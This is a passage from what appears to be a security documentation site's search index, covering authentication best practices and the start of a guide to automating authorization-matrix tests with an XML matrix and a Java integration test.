microphones(voice biometrics), Trusted Execution Environments(TEEs), Secure Elements(SEs) and others. The protocol is designed to plug-in these device capabilities into a common authentication framework. UAF works with both native applications and web applications. U2F augments password-based authentication using a hardware token (typically USB) that stores cryptographic authentication keys and uses them for signing. The user can use the same token as a second factor for multiple applications. U2F works with web applications. It provides protection against phishing by using the URL of the website to look up the stored authentication key. Password Managers \u00b6 Password managers are programs, browser plugins or web services that automate management of large number of different credentials. Most password managers have functionality to allow users to easily use them on websites, either by pasting the passwords into the login form, or by simulating the user typing them in. Web applications should at least not make password managers job more difficult than necessary by observing the following recommendations: Use standard HTML forms for username and password input with appropriate type attributes. Avoid plugin-based login pages (such as Flash or Silverlight). Implement a reasonable maximum password length, such as 64 characters, as discussed in the Password Storage Cheat Sheet . Allow any printable characters to be used in passwords. Allow users to paste into the username and password fields. Allow users to navigate between the username and password field with a single press of the Tab key.","title":"Authentication"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#authentication-cheat-sheet","text":"","title":"Authentication Cheat Sheet"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#introduction","text":"Authentication is the process of verifying that an individual, entity or website is whom it claims to be. Authentication in the context of web applications is commonly performed by submitting a username or ID and one or more items of private information that only a given user should know. Session Management is a process by which a server maintains the state of an entity interacting with it. This is required for a server to remember how to react to subsequent requests throughout a transaction. Sessions are maintained on the server by a session identifier which can be passed back and forward between the client and server when transmitting and receiving requests. Sessions should be unique per user and computationally very difficult to predict. The Session Management Cheat Sheet contains further guidance on the best practices in this area.","title":"Introduction"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#authentication-general-guidelines","text":"","title":"Authentication General Guidelines"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#user-ids","text":"Make sure your usernames/user IDs are case-insensitive. User 'smith' and user 'Smith' should be the same user. Usernames should also be unique. For high-security applications, usernames could be assigned and secret instead of user-defined public data.","title":"User IDs"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#email-address-as-a-user-id","text":"For information on validating email addresses, please visit the input validation cheatsheet email discussion .","title":"Email address as a User ID"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#authentication-solution-and-sensitive-accounts","text":"Do NOT allow login with sensitive accounts (i.e. accounts that can be used internally within the solution such as to a back-end / middle-ware / DB) to any front-end user-interface Do NOT use the same authentication solution (e.g. IDP / AD) used internally for unsecured access (e.g. public access / DMZ)","title":"Authentication Solution and Sensitive Accounts"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#implement-proper-password-strength-controls","text":"A key concern when using passwords for authentication is password strength. A \"strong\" password policy makes it difficult or even improbable for one to guess the password through either manual or automated means. The following characteristics define a strong password: Password Length Minimum length of the passwords should be enforced by the application. Passwords shorter than 8 characters are considered to be weak ( NIST SP800-63B ). Maximum password length should not be set too low , as it will prevent users from creating passphrases. A common maximum length is 64 characters due to limitations in certain hashing algorithms, as discussed in the Password Storage Cheat Sheet . It is important to set a maximum password length to prevent long password Denial of Service attacks . Do not silently truncate passwords. The Password Storage Cheat Sheet provides further guidance on how to handle passwords that are longer than the maximum length. Allow usage of all characters including unicode and whitespace. There should be no password composition rules limiting the type of characters permitted. Ensure credential rotation when a password leak, or at the time of compromise identification. Include password strength meter to help users create a more complex password and block common and previously breached passwords zxcvbn library can be used for this purpose. (Note that this library is no longer maintained) Pwned Passwords is a service where passwords can be checked against previously breached passwords. You can host it yourself or use API .","title":"Implement Proper Password Strength Controls"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#for-more-detailed-information-check","text":"ASVS v4.0 Password Security Requirements Passwords Evolved: Authentication Guidance for the Modern Era","title":"For more detailed information check"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#implement-secure-password-recovery-mechanism","text":"It is common for an application to have a mechanism that provides a means for a user to gain access to their account in the event they forget their password. Please see Forgot Password Cheat Sheet for details on this feature.","title":"Implement Secure Password Recovery Mechanism"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#store-passwords-in-a-secure-fashion","text":"It is critical for an application to store a password using the right cryptographic technique. Please see Password Storage Cheat Sheet for details on this feature.","title":"Store Passwords in a Secure Fashion"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#compare-password-hashes-using-safe-functions","text":"Where possible, the user-supplied password should be compared to the stored password hash using a secure password comparison function provided by the language or framework, such as the password_verify() function in PHP. Where this is not possible, ensure that the comparison function: Has a maximum input length, to protect against denial of service attacks with very long inputs. Explicitly sets the type of both variable, to protect against type confusion attacks such as Magic Hashes in PHP. Returns in constant time, to protect against timing attacks.","title":"Compare Password Hashes Using Safe Functions"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#transmit-passwords-only-over-tls-or-other-strong-transport","text":"See: Transport Layer Protection Cheat Sheet The login page and all subsequent authenticated pages must be exclusively accessed over TLS or other strong transport. The initial login page referred to as the \"login landing page\", must be served over TLS or other strong transport. Failure to utilize TLS or other strong transport for the login landing page allows an attacker to modify the login form action, causing the user's credentials to be posted to an arbitrary location. Failure to utilize TLS or other strong transport for authenticated pages after login enables an attacker to view the unencrypted session ID and compromise the user's authenticated session.","title":"Transmit Passwords Only Over TLS or Other Strong Transport"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#require-re-authentication-for-sensitive-features","text":"In order to mitigate CSRF and session hijacking, it's important to require the current credentials for an account before updating sensitive account information such as the user's password, user's email, or before sensitive transactions, such as shipping a purchase to a new address. Without this countermeasure, an attacker may be able to execute sensitive transactions through a CSRF or XSS attack without needing to know the user's current credentials. Additionally, an attacker may get temporary physical access to a user's browser or steal their session ID to take over the user's session.","title":"Require Re-authentication for Sensitive Features"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#consider-strong-transaction-authentication","text":"Some applications should use a second factor to check whether a user may perform sensitive operations. For more information, see the Transaction Authorization Cheat Sheet .","title":"Consider Strong Transaction Authentication"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#tls-client-authentication","text":"TLS Client Authentication, also known as two-way TLS authentication, consists of both, browser and server, sending their respective TLS certificates during the TLS handshake process. Just as you can validate the authenticity of a server by using the certificate and asking a well known Certificate Authority (CA) if the certificate is valid, the server can authenticate the user by receiving a certificate from the client and validating against a third party CA or its own CA. To do this, the server must provide the user with a certificate generated specifically for him, assigning values to the subject so that these can be used to determine what user the certificate should validate. The user installs the certificate on a browser and now uses it for the website. It is a good idea to do this when: It is acceptable (or even preferred) that the user only has access to the website from only a single computer/browser. The user is not easily scared by the process of installing TLS certificates on his browser, or there will be someone, probably from IT support, that will do this for the user. The website requires an extra step of security. It is also a good thing to use when the website is for an intranet of a company or organization. It is generally not a good idea to use this method for widely and publicly available websites that will have an average user. For example, it wouldn't be a good idea to implement this for a website like Facebook. While this technique can prevent the user from having to type a password (thus protecting against an average keylogger from stealing it), it is still considered a good idea to consider using both a password and TLS client authentication combined. Additionally, if the client is behind an enterprise proxy which performs SSL/TLS decryption, this will break certificate authentication unless the site is whitelisted on the proxy. For more information, see: Client-authenticated TLS handshake","title":"TLS Client Authentication"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#authentication-and-error-messages","text":"Incorrectly implemented error messages in the case of authentication functionality can be used for the purposes of user ID and password enumeration. An application should respond (both HTTP and HTML) in a generic manner.","title":"Authentication and Error Messages"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#authentication-responses","text":"Using any of the authentication mechanisms (login, password reset or password recovery), an application must respond with a generic error message regardless of whether: The user ID or password was incorrect. The account does not exist. The account is locked or disabled. The account registration feature should also be taken into consideration, and the same approach of generic error message can be applied regarding the case in which the user exists. The objective is to prevent the creation of a discrepancy factor , allowing an attacker to mount a user enumeration action against the application. It is interesting to note that the business logic itself can bring a discrepancy factor related to the processing time taken. Indeed, depending on the implementation, the processing time can be significantly different according to the case (success vs failure) allowing an attacker to mount a time-based attack (delta of some seconds for example). Example using pseudo-code for a login feature: First implementation using the \"quick exit\" approach IF USER_EXISTS(username) THEN password_hash=HASH(password) IS_VALID=LOOKUP_CREDENTIALS_IN_STORE(username, password_hash) IF NOT IS_VALID THEN RETURN Error(\"Invalid Username or Password!\") ENDIF ELSE RETURN Error(\"Invalid Username or Password!\") ENDIF It can be clearly seen that if the user doesn't exist, the application will directly throw an error. Otherwise, when the user exists and the password doesn't, it is apparent that there will be more processing before the application errors out. In return, the response time will be different for the same error, allowing the attacker to differentiate between a wrong username and a wrong password. Second implementation without relying on the \"quick exit\" approach: password_hash=HASH(password) IS_VALID=LOOKUP_CREDENTIALS_IN_STORE(username, password_hash) IF NOT IS_VALID THEN RETURN Error(\"Invalid Username or Password!\") ENDIF This code will go through the same process no matter what the user or the password is, allowing the application to return in approximately the same response time. The problem with returning a generic error message for the user is a User Experience (UX) matter. A legitimate user might feel confused with the generic messages, thus making it hard for them to use the application, and might after several retries, leave the application because of its complexity. The decision to return a generic error message can be determined based on the criticality of the application and its data. For example, for critical applications, the team can decide that under the failure scenario, a user will always be redirected to the support page and a generic error message will be returned. Regarding the user enumeration itself, protection against brute-force attack are also effective because they prevent an attacker from applying the enumeration at scale. Usage of CAPTCHA can be applied on a feature for which a generic error message cannot be returned because the user experience must be preserved.","title":"Authentication Responses"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#incorrect-and-correct-response-examples","text":"","title":"Incorrect and correct response examples"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#login","text":"Incorrect response examples: \"Login for User foo: invalid password.\" \"Login failed, invalid user ID.\" \"Login failed; account disabled.\" \"Login failed; this user is not active.\" Correct response example: \"Login failed; Invalid user ID or password.\"","title":"Login"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#password-recovery","text":"Incorrect response examples: \"We just sent you a password reset link.\" \"This email address doesn't exist in our database.\" Correct response example: \"If that email address is in our database, we will send you an email to reset your password.\"","title":"Password recovery"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#account-creation","text":"Incorrect response examples: \"This user ID is already in use.\" \"Welcome! You have signed up successfully.\" Correct response example: \"A link to activate your account has been emailed to the address provided.\"","title":"Account creation"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#error-codes-and-urls","text":"The application may return a different HTTP Error code depending on the authentication attempt response. It may respond with a 200 for a positive result and a 403 for a negative result. Even though a generic error page is shown to a user, the HTTP response code may differ which can leak information about whether the account is valid or not. Error disclosure can also be used as a discrepancy factor, consult the error handling cheat sheet regarding the global handling of different errors in an application.","title":"Error Codes and URLs"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#protect-against-automated-attacks","text":"There are a number of different types of automated attacks that attackers can use to try and compromise user accounts. The most common types are listed below: Attack Type Description Brute Force Testing multiple passwords from a dictionary or other source against a single account. Credential Stuffing Testing username/password pairs obtained from the breach of another site. Password Spraying Testing a single weak password against a large number of different accounts. Different protection mechanisms can be implemented to protect against these attacks. In many cases, these defences do not provide complete protection, but when a number of them are implemented in a defence-in-depth approach, a reasonable level of protection can be achieved. The following sections will focus primarily on preventing brute-force attacks, although these controls can also be effective against other types of attacks. For further guidance on defending against credential stuffing and password spraying, see the Credential Stuffing Cheat Sheet .","title":"Protect Against Automated Attacks"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#multi-factor-authentication","text":"Multi-factor authentication (MFA) is by far the best defence against the majority of password-related attacks, including brute-force attacks, with analysis by Microsoft suggesting that it would have stopped 99.9% of account compromises . As such, it should be implemented wherever possible; however, depending on the audience of the application, it may not be practical or feasible to enforce the use of MFA. The Multifactor Authentication Cheat Sheet contains further guidance on implementing MFA.","title":"Multi-Factor Authentication"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#account-lockout","text":"The most common protection against these attacks is to implement account lockout, which prevents any more login attempts for a period after a certain number of failed logins. The counter of failed logins should be associated with the account itself, rather than the source IP address, in order to prevent an attacker from making login attempts from a large number of different IP addresses. There are a number of different factors that should be considered when implementing an account lockout policy in order to find a balance between security and usability: The number of failed attempts before the account is locked out (lockout threshold). The time period that these attempts must occur within (observation window). How long the account is locked out for (lockout duration). Rather than implementing a fixed lockout duration (e.g., ten minutes), some applications use an exponential lockout, where the lockout duration starts as a very short period (e.g., one second), but doubles after each failed login attempt. When designing an account lockout system, care must be taken to prevent it from being used to cause a denial of service by locking out other users' accounts. One way this could be performed is to allow the user of the forgotten password functionality to log in, even if the account is locked out.","title":"Account Lockout"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#captcha","text":"The use of an effective CAPTCHA can help to prevent automated login attempts against accounts. However, many CAPTCHA implementations have weaknesses that allow them to be solved using automated techniques or can be outsourced to services which can solve them. As such, the use of CAPTCHA should be viewed as a defence-in-depth control to make brute-force attacks more time consuming and expensive, rather than as a preventative. It may be more user-friendly to only require a CAPTCHA be solved after a small number of failed login attempts, rather than requiring it from the very first login.","title":"CAPTCHA"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#security-questions-and-memorable-words","text":"The addition of a security question or memorable word can also help protect against automated attacks, especially when the user is asked to enter a number of randomly chosen characters from the word. It should be noted that this does not constitute multi-factor authentication, as both factors are the same (something you know). Furthermore, security questions are often weak and have predictable answers, so they must be carefully chosen. The Choosing and Using Security Questions cheat sheet contains further guidance on this.","title":"Security Questions and Memorable Words"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#logging-and-monitoring","text":"Enable logging and monitoring of authentication functions to detect attacks/failures on a real-time basis Ensure that all failures are logged and reviewed Ensure that all password failures are logged and reviewed Ensure that all account lockouts are logged and reviewed","title":"Logging and Monitoring"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#use-of-authentication-protocols-that-require-no-password","text":"While authentication through a user/password combination and using multi-factor authentication is considered generally secure, there are use cases where it isn't considered the best option or even safe. Examples of this are third party applications that desire connecting to the web application, either from a mobile device, another website, desktop or other situations. When this happens, it is NOT considered safe to allow the third-party application to store the user/password combo, since then it extends the attack surface into their hands, where it isn't in your control. For this, and other use cases, there are several authentication protocols that can protect you from exposing your users' data to attackers.","title":"Use of authentication protocols that require no password"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#oauth","text":"Open Authorization (OAuth) is a protocol that allows an application to authenticate against a server as a user, without requiring passwords or any third party server that acts as an identity provider. It uses a token generated by the server and provides how the authorization flows most occur, so that a client, such as a mobile application, can tell the server what user is using the service. The recommendation is to use and implement OAuth 1.0a or OAuth 2.0 since the very first version (OAuth1.0) has been found to be vulnerable to session fixation. OAuth 2.0 relies on HTTPS for security and is currently used and implemented by APIs from companies such as Facebook, Google, Twitter and Microsoft. OAuth1.0a is more difficult to use because it requires the use of cryptographic libraries for digital signatures. However, since OAuth1.0a does not rely on HTTPS for security, it can be more suited for higher-risk transactions.","title":"OAuth"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#openid","text":"OpenId is an HTTP-based protocol that uses identity providers to validate that a user is whom he says he is. It is a very simple protocol which allows a service provider initiated way for single sign-on (SSO). This allows the user to re-use a single identity given to a trusted OpenId identity provider and be the same user in multiple websites, without the need to provide any website with the password, except for the OpenId identity provider. Due to its simplicity and that it provides protection of passwords, OpenId has been well adopted. Some of the well-known identity providers for OpenId are Stack Exchange, Google, Facebook and Yahoo! For non-enterprise environments, OpenId is considered a secure and often better choice, as long as the identity provider is of trust.","title":"OpenId"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#saml","text":"Security Assertion Markup Language (SAML) is often considered to compete with OpenId. The most recommended version is 2.0 since it is very features complete and provides strong security. Like OpenId, SAML uses identity providers, but unlike OpenId, it is XML-based and provides more flexibility. SAML is based on browser redirects which send XML data. Furthermore, SAML isn't only initiated by a service provider; it can also be initiated from the identity provider. This allows the user to navigate through different portals while still being authenticated without having to do anything, making the process transparent. While OpenId has taken most of the consumer market, SAML is often the choice for enterprise applications. The reason for this is often that there are few OpenId identity providers which are considered of enterprise-class (meaning that the way they validate the user identity doesn't have high standards required for enterprise identity). It is more common to see SAML being used inside of intranet websites, sometimes even using a server from the intranet as the identity provider. In the past few years, applications like SAP ERP and SharePoint (SharePoint by using Active Directory Federation Services 2.0) have decided to use SAML 2.0 authentication as an often preferred method for single sign-on implementations whenever enterprise federation is required for web services and web applications. See also: SAML Security Cheat Sheet","title":"SAML"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#fido","text":"The Fast Identity Online (FIDO) Alliance has created two protocols to facilitate online authentication: the Universal Authentication Framework (UAF) protocol and the Universal Second Factor (U2F) protocol. While UAF focuses on passwordless authentication, U2F allows the addition of a second factor to existing password-based authentication. Both protocols are based on a public key cryptography challenge-response model. UAF takes advantage of existing security technologies present on devices for authentication including fingerprint sensors, cameras(face biometrics), microphones(voice biometrics), Trusted Execution Environments(TEEs), Secure Elements(SEs) and others. The protocol is designed to plug-in these device capabilities into a common authentication framework. UAF works with both native applications and web applications. U2F augments password-based authentication using a hardware token (typically USB) that stores cryptographic authentication keys and uses them for signing. The user can use the same token as a second factor for multiple applications. U2F works with web applications. It provides protection against phishing by using the URL of the website to look up the stored authentication key.","title":"FIDO"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html#password-managers","text":"Password managers are programs, browser plugins or web services that automate management of large number of different credentials. Most password managers have functionality to allow users to easily use them on websites, either by pasting the passwords into the login form, or by simulating the user typing them in. Web applications should at least not make password managers job more difficult than necessary by observing the following recommendations: Use standard HTML forms for username and password input with appropriate type attributes. Avoid plugin-based login pages (such as Flash or Silverlight). Implement a reasonable maximum password length, such as 64 characters, as discussed in the Password Storage Cheat Sheet . Allow any printable characters to be used in passwords. Allow users to paste into the username and password fields. Allow users to navigate between the username and password field with a single press of the Tab key.","title":"Password Managers"},{"location":"cheatsheets/Authorization_Testing_Automation_Cheat_Sheet.html","text":"Authorization Testing Automation \u00b6 Introduction \u00b6 Authorizations definition and implementation is one of the important protection measure of an application. They are defined in the creation phase of the project and, even if authorization issues are found when the application is initially released and submitted to a security audit before to go live, the most significant number of issues related to authorization came in the maintenance lifetime of the application. This situation is often explained by the fact that features are added/modified and no review of the authorizations was performed on the application before the publishing of the new release, for cost or time issue reason. Context \u00b6 In order to try to address this situation, it's can be interesting to automate the evaluation of the authorizations definition and implementation on the application. This, to constantly ensure that implementation of the authorizations in the application is consistent with the authorizations definition. An authorization is often composed by 2 elements (also named dimensions): The Feature and the Logical Role that can access it (sometime a third dimension named Data is added in order to define a access that include a filtering at business data level). The representation of the different combinations of these 2 dimensions is often named an Authorization matrix and is often formalized in an Microsoft Excel file. During a test of an authorization, a Logical Role is also called a Point Of View . Objective \u00b6 This article describe a proposition of implementation in order to automate the tests of an authorization matrix . This article use the assumption that 2 dimensions are used to represents an authorization for the technical proposition described and take as example a application exposing REST services. The objective is to provide starting ideas/hints in order to create a tailored way of testing of the authorization matrix for the target application. Proposition \u00b6 In order to achieve the full automation of the evaluation of the authorization matrix , the following actions has been performed: Formalize the authorization matrix in a pivot format file allowing: The processing by a program in a easy way. To be read and updated by a human for the follow-up of the authorization combinations. Hierarchy in the information in order to easily materialize the different combinations. The maximum possible of independence from the technology and design used to implements the application exposing the features. Create a set of integration tests that fully use the authorization matrix pivot file as input source in order to evaluate the different combinations with: The minimum possible of maintenance when the authorization matrix pivot file is updated. A clear indication, in case of failed test, of the source authorization combination that do not respect the authorization matrix. Authorization matrix pivot file \u00b6 The XML format has been used to formalize the authorization matrix. The XML structure contains 3 main sections: Node roles : This node describe the possible logical roles used in the system, is used to provide a list and the explanation of the different roles (authorization level). Node services : This node list and describe the available services exposed by the system and the associated logical role(s) that can call them. Node services-testing : This node provide a test payload for each service if the service use input data other than coming from URL or path. This is an example of the XML used to represents the authorization: Placeholders (values between {}) are used to mark location where test value must be placed by the integration tests if needed <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!-- This file materialize the authorization matrix for the different services exposed by the system. It will be used by the tests as a input sources for the different tests cases: 1) Evaluate legitimate access and is correct implementation 2) Identify not legitimate access (authorization definition issue on service implementation) The \"name\" attribute is used for identify uniquely a SERVICE or a ROLE. --> <authorization-matrix> <!-- Describe the possible logical roles used in the system, is used here to provide a list+explanation of the different roles (authorization level) --> <roles> <role name= \"ANONYMOUS\" description= \"Indicate that no authorization is needed\" /> <role name= \"BASIC\" description= \"Role affected to a standard user (lowest access right just above anonymous)\" /> <role name= \"ADMIN\" description= \"Role affected to a administrator user (highest access right)\" /> </roles> <!-- List and describe the available services exposed by the system and the associated logical role(s) that can call them --> <services> <service name= \"ReadSingleMessage\" uri= \"/{messageId}\" http-method= \"GET\" http-response-code-for-access-allowed= \"200\" http-response-code-for-access-denied= \"403\" > <role name= \"ANONYMOUS\" /> <role name= \"BASIC\" /> <role name= \"ADMIN\" /> </service> <service name= \"ReadAllMessages\" uri= \"/\" http-method= \"GET\" http-response-code-for-access-allowed= \"200\" http-response-code-for-access-denied= \"403\" > <role name= \"ANONYMOUS\" /> <role name= \"BASIC\" /> <role name= \"ADMIN\" /> </service> <service name= \"CreateMessage\" uri= \"/\" http-method= \"PUT\" http-response-code-for-access-allowed= \"200\" http-response-code-for-access-denied= \"403\" > <role name= \"BASIC\" /> <role name= \"ADMIN\" /> </service> <service name= \"DeleteMessage\" uri= \"/{messageId}\" http-method= \"DELETE\" http-response-code-for-access-allowed= \"200\" http-response-code-for-access-denied= \"403\" > <role name= \"ADMIN\" /> </service> </services> <!-- Provide a test payload for each service if needed --> <services-testing> <service name= \"ReadSingleMessage\" > <payload/> </service> <service name= \"ReadAllMessages\" > <payload/> </service> <service name= \"CreateMessage\" > <payload content-type= \"application/json\" > {\"content\":\"test\"} </payload> </service> <service name= \"DeleteMessage\" > <payload/> </service> </services-testing> </authorization-matrix> Integration tests \u00b6 Integration tests are implemented using a maximum of factorized code and one test case by Point Of View (POV) has been created in order to group the verifications by profile of access level (logical role) and facilitate the rendering/identification of the errors. Parsing, object mapping and access to the authorization matrix information has been implemented using XML marshalling/unmarshalling built-in features provided by the technology used to implements the tests (JAXB here) in order to limit the code to the one in charge of performing the tests. This the implementation of the integration tests case class: import org.owasp.pocauthztesting.enumeration.SecurityRole ; import org.owasp.pocauthztesting.service.AuthService ; import org.owasp.pocauthztesting.vo.AuthorizationMatrix ; import org.apache.http.client.methods.CloseableHttpResponse ; import org.apache.http.client.methods.HttpDelete ; import org.apache.http.client.methods.HttpGet ; import org.apache.http.client.methods.HttpPut ; import org.apache.http.client.methods.HttpRequestBase ; import org.apache.http.entity.StringEntity ; import org.apache.http.impl.client.CloseableHttpClient ; import org.apache.http.impl.client.HttpClients ; import org.junit.Assert ; import org.junit.BeforeClass ; import org.junit.Test ; import org.xml.sax.InputSource ; import javax.xml.bind.JAXBContext ; import javax.xml.parsers.SAXParserFactory ; import javax.xml.transform.Source ; import javax.xml.transform.sax.SAXSource ; import java.io.File ; import java.io.FileInputStream ; import java.util.ArrayList ; import java.util.List ; import java.util.Optional ; /** * Integration Test cases in charge of validate the correct implementation of the authorization matrix. * Create on test case by logical role that will test access on all services exposed by the system. * Implements here focus on readability */ public class AuthorizationMatrixIT { /** * Object representation of the authorization matrix */ private static AuthorizationMatrix AUTHZ_MATRIX ; private static final String BASE_URL = \"http://localhost:8080\" ; /** * Load the authorization matrix in objects tree * * @throws Exception If any error occurs */ @BeforeClass public static void globalInit () throws Exception { try ( FileInputStream fis = new FileInputStream ( new File ( \"authorization-matrix.xml\" ))) { SAXParserFactory spf = SAXParserFactory . newInstance (); spf . setFeature ( \"http://xml.org/sax/features/external-general-entities\" , false ); spf . setFeature ( \"http://xml.org/sax/features/external-parameter-entities\" , false ); spf . setFeature ( \"http://apache.org/xml/features/nonvalidating/load-external-dtd\" , false ); Source xmlSource = new SAXSource ( spf . newSAXParser (). getXMLReader (), new InputSource ( fis )); JAXBContext jc = JAXBContext . newInstance ( AuthorizationMatrix . class ); AUTHZ_MATRIX = ( AuthorizationMatrix ) jc . createUnmarshaller (). unmarshal ( xmlSource ); } } /** * Test access to the services from a anonymous user. * * @throws Exception */ @Test public void testAccessUsingAnonymousUserPointOfView () throws Exception { //Run the tests - No access token here List < String > errors = executeTestWithPointOfView ( SecurityRole . ANONYMOUS , null ); //Verify the test results Assert . assertEquals ( \"Access issues detected using the ANONYMOUS USER point of view:\\n\" + formatErrorsList ( errors ), 0 , errors . size ()); } /** * Test access to the services from a basic user. * * @throws Exception */ @Test public void testAccessUsingBasicUserPointOfView () throws Exception { //Get access token representing the authorization for the associated point of view String accessToken = generateTestCaseAccessToken ( \"basic\" , SecurityRole . BASIC ); //Run the tests List < String > errors = executeTestWithPointOfView ( SecurityRole . BASIC , accessToken ); //Verify the test results Assert . assertEquals ( \"Access issues detected using the BASIC USER point of view:\\n \" + formatErrorsList ( errors ), 0 , errors . size ()); } /** * Test access to the services from a administrator user. * * @throws Exception */ @Test public void testAccessUsingAdministratorUserPointOfView () throws Exception { //Get access token representing the authorization for the associated point of view String accessToken = generateTestCaseAccessToken ( \"admin\" , SecurityRole . ADMIN ); //Run the tests List < String > errors = executeTestWithPointOfView ( SecurityRole . ADMIN , accessToken ); //Verify the test results Assert . assertEquals ( \"Access issues detected using the ADMIN USER point of view:\\n\" + formatErrorsList ( errors ), 0 , errors . size ()); } /** * Evaluate the access to all service using the point of view (POV) specified. * * @param pointOfView Point of view to use * @param accessToken Access token that is linked to the point of view in terms of authorization. * @return List of errors detected * @throws Exception If any error occurs */ private List < String > executeTestWithPointOfView ( SecurityRole pointOfView , String accessToken ) throws Exception { List < String > errors = new ArrayList <> (); String errorMessageTplForUnexpectedReturnCode = \"The service '%s' when called with POV '%s' return a response code %s that is not the expected one in allowed or denied case.\" ; String errorMessageTplForIncorrectReturnCode = \"The service '%s' when called with POV '%s' return a response code %s that is not the expected one (%s expected).\" ; String fatalErrorMessageTpl = \"The service '%s' when called with POV %s meet the error: %s\" ; //Get the list of services to call List < AuthorizationMatrix . Services . Service > services = AUTHZ_MATRIX . getServices (). getService (); //Get the list of services test payload to use List < AuthorizationMatrix . ServicesTesting . Service > servicesTestPayload = AUTHZ_MATRIX . getServicesTesting (). getService (); //Call all services sequentially (no special focus on performance here) services . forEach ( service -> { //Get the service test payload for the current service String payload = null ; String payloadContentType = null ; Optional < AuthorizationMatrix . ServicesTesting . Service > serviceTesting = servicesTestPayload . stream (). filter ( srvPld -> srvPld . getName (). equals ( service . getName ())). findFirst (); if ( serviceTesting . isPresent ()) { payload = serviceTesting . get (). getPayload (). getValue (); payloadContentType = serviceTesting . get (). getPayload (). getContentType (); } //Call the service and verify if the response is consistent try { //Call the service int serviceResponseCode = callService ( service . getUri (), payload , payloadContentType , service . getHttpMethod (), accessToken ); //Check if the role represented by the specified point of view is defined for the current service Optional < AuthorizationMatrix . Services . Service . Role > role = service . getRole (). stream (). filter ( r -> r . getName (). equals ( pointOfView . name ())). findFirst (); boolean accessIsGrantedInAuthorizationMatrix = role . isPresent (); //Verify behavior consistency according to the response code returned and the authorization configured in the matrix if ( serviceResponseCode == service . getHttpResponseCodeForAccessAllowed ()) { //Roles is not in the list of role allowed to access to the service so it's an error if ( ! accessIsGrantedInAuthorizationMatrix ) { errors . add ( String . format ( errorMessageTplForIncorrectReturnCode , service . getName (), pointOfView . name (), serviceResponseCode , service . getHttpResponseCodeForAccessDenied ())); } } else if ( serviceResponseCode == service . getHttpResponseCodeForAccessDenied ()) { //Roles is in the list of role allowed to access to the service so it's an error if ( accessIsGrantedInAuthorizationMatrix ) { errors . add ( String . format ( errorMessageTplForIncorrectReturnCode , service . getName (), pointOfView . name (), serviceResponseCode , service . getHttpResponseCodeForAccessAllowed ())); } } else { errors . add ( String . format ( errorMessageTplForUnexpectedReturnCode , service . getName (), pointOfView . name (), serviceResponseCode )); } } catch ( Exception e ) { errors . add ( String . format ( fatalErrorMessageTpl , service . getName (), pointOfView . name (), e . getMessage ())); } }); return errors ; } /** * Call a service with a specific payload and return the HTTP response code received. * Delegate this step in order to made the test cases more easy to maintain. * * @param uri URI of the target service * @param payloadContentType Content type of the payload to send * @param payload Payload to send * @param httpMethod HTTP method to use * @param accessToken Access token to specify to represent the identity of the caller * @return The HTTP response code received * @throws Exception If any error occurs */ private int callService ( String uri , String payload , String payloadContentType , String httpMethod , String accessToken ) throws Exception { int rc ; //Build the request - Use Apache HTTP Client in order to be more flexible in the combination HttpRequestBase request ; String url = ( BASE_URL + uri ). replaceAll ( \"\\\\{messageId\\\\}\" , \"1\" ); switch ( httpMethod ) { case \"GET\" : request = new HttpGet ( url ); break ; case \"DELETE\" : request = new HttpDelete ( url ); break ; case \"PUT\" : request = new HttpPut ( url ); if ( payload != null ) { request . setHeader ( \"Content-Type\" , payloadContentType ); (( HttpPut ) request ). setEntity ( new StringEntity ( payload . trim ())); } break ; default : throw new UnsupportedOperationException ( httpMethod + \" not supported !\" ); } request . setHeader ( \"Authorization\" , ( accessToken != null ) ? accessToken : \"\" ); //Send the request and get the HTTP response code try ( CloseableHttpClient httpClient = HttpClients . createDefault ()) { try ( CloseableHttpResponse httpResponse = httpClient . execute ( request )) { //Don't care here about the response content... rc = httpResponse . getStatusLine (). getStatusCode (); } } return rc ; } /** * Generate a JWT token the user and role specified. * * @param login User login * @param role Authorization logical role * @return The JWT token * @throws Exception If any error occurs during the creation */ private String generateTestCaseAccessToken ( String login , SecurityRole role ) throws Exception { return new AuthService (). issueAccessToken ( login , role ); } /** * Format a list of errors to a printable string * * @param errors Error list * @return Printable string */ private String formatErrorsList ( List < String > errors ) { StringBuilder buffer = new StringBuilder (); errors . forEach ( e -> buffer . append ( e ). append ( \"\\n\" )); return buffer . toString (); } } In case of detection of a authorization issue(s) the output is the following: testAccessUsingAnonymousUserPointOfView ( org . owasp . pocauthztesting . AuthorizationMatrixIT ) Time elapsed : 1.009 s ### FAILURE java . lang . AssertionError : Access issues detected using the ANONYMOUS USER point of view : The service ' DeleteMessage ' when called with POV ' ANONYMOUS ' return a response code 200 that is not the expected one ( 403 expected ). The service ' 